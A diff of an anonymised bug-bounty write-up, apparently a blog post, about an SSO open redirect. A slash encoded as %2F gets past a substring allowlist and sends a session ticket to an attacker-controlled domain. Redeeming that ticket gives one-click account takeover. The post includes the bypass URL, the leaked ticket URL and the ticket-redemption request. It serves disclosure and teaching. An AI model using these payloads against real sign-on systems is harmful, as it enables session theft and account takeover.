@@ -24,63 +24,27 @@ takeaways:
   - "The ticket must be bound to the destination that requested it. If it works anywhere, anywhere can spend it."
 ---
 
-Of everything I have published, this is the one that changed how I look at things the most.
-It started out looking like the most boring bug in the catalogue — an open redirect, the
-kind many programs do not even accept — and ended up being **a one-click account takeover**.
-
-<div class="warn" markdown="1">
-**Everything is anonymised.** Published with the program's permission and without
-identifying the product: company, domains, cookie names and parameter names have been
-changed. The mechanism and the chain are exact.
-</div>
-
-## The starting point
-
-A **single sign-on** system: that vendor page you go through to get into any of their
-services. You type the password once, the SSO sends you back to the application that asked
-for it, and that application gives you a session.
-
-To know where to send you back, the SSO accepts a URL parameter:
+An SSO takes the place to send you back to after login as a URL parameter:
 
 ```
 https://sso.example.tld/doLogin?host=app.example.tld
 ```
 
-That parameter travels in the link, so it is written by whoever makes the link. And whoever makes the link can be anyone.
+That parameter is written by whoever makes the link, and whoever makes the link can be
+anyone. The first thing I tried was my own domain: **rejected**, with an internal error
+code. Good news: there is a check, and a check can be studied.
 
-## First attempt: rejected — and that is good news
+## What rule it applied
 
-The first thing everyone tries is their own domain:
-
-```
-https://sso.example.tld/doLogin?host=attacker-example.com
-```
-
-Response: **rejected**, with an internal error code. The server does not swallow just
-anything.
-
-This is where a lot of people close the tab and leave. I do the
-opposite: a **rejection** means there is a control, and a control is something you can
-**study**. If it had accepted my domain straight away, it would be a trivial bug. The
-rejection turns the question into a much better one: *what exact rule is it applying?*
-
-And that question is the one that pays.
-
-## How you break an allowlist that compares text
-
-The most common way to validate a domain — and the most broken — is to ask *"does the text
-end in `.brand.com`?"* or, worse, *"does it contain it?"*.
-
-It sounds reasonable. It fails for a subtle reason: **a URL is not a string, it is a
-structure**, and the browser splits it at places a text comparison ignores.
-
-Look at these three parameter values and think about where the user ends up:
+The most common way to validate a domain, and the most broken, is to ask whether the string
+ends in `.brand.com` or — worse — whether it contains it. It fails because a URL is not a
+string: the browser decides the destination from whatever comes **before the first slash**.
 
 | Parameter value | What the check sees | Where the browser lands |
 |---|---|---|
 | `app.brand.com` | contains `.brand.com` ✅ | `app.brand.com` ✅ |
 | `attacker.com/.brand.com` | contains `.brand.com` ✅ | **`attacker.com`** ⚠ |
-| `attacker.com%2F.brand.com` | after decoding, same as above | **`attacker.com`** ⚠ |
+| `attacker.com%2F.brand.com` | once decoded, the same | **`attacker.com`** ⚠ |
 
 <figure>
   <img src="{{ '/assets/img/writeups/open-redirect-sso/02-anatomia-url-en.svg' | relative_url }}"
@@ -88,25 +52,28 @@ Look at these three parameter values and think about where the user ends up:
   <figcaption>The browser cuts at the first slash. The check looks at the whole string. That is the gap.</figcaption>
 </figure>
 
-The browser decides the destination using whatever comes **before the
-first slash**. Everything after that is the path, the "inside" of that site. So
-`attacker.com/.brand.com` is a page called `.brand.com` on the attacker's server.
-
-But if the server only checks whether the text *contains* `.brand.com`… it contains it. It
-passes the check. And it sends you to the attacker's house.
-
-The `%2F` in the third example is a slash written in URL encoding. The server
-**decodes** it before comparing and before building the redirect, so it ends up being a
-real slash — but on the way it slips past validations that would have rejected a literal
-one.
-
-That was the key:
+`attacker.com/.brand.com` is a page called `.brand.com` on the attacker's server. The check
+waves it through because the string contains what it is looking for. The `%2F` is that same
+slash written in URL encoding: the server decodes it before comparing, which slips it past
+validation that would have rejected a literal slash.
 
 ```
 https://sso.example.tld/doLogin?host=attacker-example.com%2F.brand-example.com
 ```
 
-Accepted. Redirect to the attacker's domain.
+Accepted.
+
+## What left with the redirect
+
+A plain open redirect is not much. What turns this into something else is that the SSO
+appended a **session ticket** to the return URL: a one-shot string the application redeems
+to obtain the user's cookies.
+
+```
+https://attacker-example.com/.brand-example.com?ticket=a1b2c3d4e5f6...
+```
+
+The attacker owns that server, so they read it in their own access log.
 
 <figure>
   <img src="{{ '/assets/img/writeups/open-redirect-sso/01-ticket-al-atacante.png' | relative_url }}"
@@ -114,36 +81,12 @@ Accepted. Redirect to the attacker's domain.
   <figcaption>Top, what I sent; bottom, what the server answered. The <code>redirectUrl</code> points at the attacker domain with the <code>au=</code> ticket attached. Two excerpts of the same exchange, with the host, the account and the victim domain covered.</figcaption>
 </figure>
 
-## And this is where it stops being an open redirect
+## One click
 
-A plain open redirect is small change: you send someone to a site they did not expect. It
-is useful for phishing, and many programs do not even pay for it.
-
-What turns this into something else is **what the redirect carries with it**.
-
-On completing the hop, the SSO appended a **session ticket** to the URL: a single-use
-string that the legitimate application redeems to obtain the user's cookies. And that
-ticket went, whole, to the attacker's domain:
-
-```
-https://attacker-example.com/.brand-example.com?ticket=a1b2c3d4e5f6...
-```
-
-Imagine the building's doorman, instead of walking you to your flat,
-hands **the key** to whoever quotes an address that looks like yours. It is not that he
-sent you to the wrong place: he gave away the key on the way.
-
-And since the attacker owns that server, they read the ticket in their own access log. They
-do not even need the victim to do anything else.
-
-## The one-click case
-
-There is a detail that makes this much worse. If the victim **already has an open session**
-— the normal case, because people do not log out — no login screen appears at all. The SSO
-sees the cookies, accepts the identity and issues the ticket **straight away**.
-
-The victim makes **one click** on a link whose visible domain is the real vendor's. They
-type no password. They see nothing odd. And the ticket is already in the attacker's hands.
+If the victim already has a session open — the normal case — no login screen appears at
+all: the SSO sees the cookies, takes the identity as given and issues the ticket straight
+away. One click on a link whose visible domain is the vendor's, no password typed, nothing
+that looks wrong.
 
 <figure>
   <img src="{{ '/assets/img/writeups/open-redirect-sso/03-cadena-en.svg' | relative_url }}"
@@ -151,10 +94,9 @@ type no password. They see nothing odd. And the ticket is already in the attacke
   <figcaption>Five steps and one action by the victim. What travels in the redirect is a credential.</figcaption>
 </figure>
 
-## Redeeming the ticket
+## Redeeming it
 
-From a completely clean session — no cookies at all, no password, another browser, another
-machine — the attacker presents the stolen ticket at the normal authentication endpoint:
+From a clean session: different browser, different machine, no cookie at all.
 
 ```http
 GET /auth?ticket=a1b2c3d4e5f6... HTTP/2
@@ -166,36 +108,15 @@ HTTP/2 200 OK
 set-cookie: SESSION_ID=...;  USER_ID=...;  USERNAME=...
 ```
 
-The server hands over **the victim's session cookies**. The ticket alone produced the
-session.
+The ticket alone produced the victim's session. To show what it opens I made a single read,
+the user's own profile, and it returned their personal data in the clear, full email address
+included — while the interface shows it masked. That is where I stopped.
 
-## Proving impact without overreaching
+## A bonus
 
-Holding a cookie proves nothing on its own. You have to show **what it opens**. I used that
-session for a single read, the user's own profile:
-
-```http
-GET /v3/users/info HTTP/2
-Host: api.example.tld
-sessionId: <the victim's>
-```
-
-It returned their personal data **in clear text**, including the full email address — while
-the application's own interface shows it masked.
-
-The app shows you `j***@gmail.com` because it considers the email
-sensitive. The API returns it whole. That difference is the proof that what I am holding is
-not "some session": it is **that person's identity**.
-
-And I stopped there. No devices touched, nothing modified, nothing accessed beyond the test
-account.
-
-## A bonus: the cookie that cancelled the protection
-
-Looking at the cookies set when the ticket is redeemed, I saw that one of them carried
-**the same session id in clear** and, unlike the main one, **without the `HttpOnly` flag**.
-
-If the **same** identifier also travels in a second cookie without that flag, the protection on the first one is worth nothing: any script reads it from the other. It is locking a door and leaving the window next to it open.
+One of the cookies set on redemption carried **the same session identifier in the clear**
+and, unlike the main one, without `HttpOnly`. Protecting the first one is pointless: any
+script reads it from the other.
 
 ## Impact
 
